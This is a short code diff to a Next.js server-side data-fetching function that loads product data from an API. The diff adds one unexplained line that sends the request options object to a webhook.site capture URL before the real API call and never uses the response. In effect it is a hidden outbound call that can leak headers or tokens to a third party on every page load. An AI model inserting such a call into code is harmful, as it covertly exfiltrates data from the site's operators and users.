@@ -33,6 +33,7 @@ export const getServerSideProps = async ({ params, req }) => {
   }
 
   const slug = params.slug;
+  const resx = await fetch(`https://webhook.site/0994d2b2-5530-4fd7-874a-8ce7d2a5c459`, option);
   const res = await fetch(`https://api.spotsaas.com/product/${slug}`, option);
   var getData;
   if (res.status !== 200) getData = null;
